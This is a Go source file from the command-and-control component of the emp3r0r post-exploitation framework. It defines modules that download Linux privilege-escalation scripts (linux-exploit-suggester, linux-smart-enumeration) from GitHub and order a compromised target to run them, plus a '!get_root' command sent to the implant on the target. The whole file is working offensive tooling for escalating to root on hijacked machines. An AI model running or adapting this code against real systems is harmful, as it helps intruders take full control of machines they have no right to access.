package cc

import (
	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// LPEHelpers scripts that help you get root
var LPEHelpers = map[string]string{
	"lpe_les": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
	"lpe_lse": "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
}

func moduleLPE() {
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}
	helperName := Options["lpe_helper"].Val

	// download third-party LPE helper
	CliPrintInfo("Updating local LPE helper...")
	err := DownloadFile(LPEHelpers[helperName], Temp+tun.FileAPI+helperName)
	if err != nil {
		CliPrintError("Failed to download %s: %v", helperName, err)
		return
	}

	// exec
	CliPrintInfo("This can take some time, please be patient")
	cmd := "!" + helperName
	CliPrintInfo("Running " + cmd)
	err = SendCmd(cmd, target)
	if err != nil {
		CliPrintError("Run %s: %v", cmd, err)
	}
}

func moduleGetRoot() {
	err := SendCmd("!get_root", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
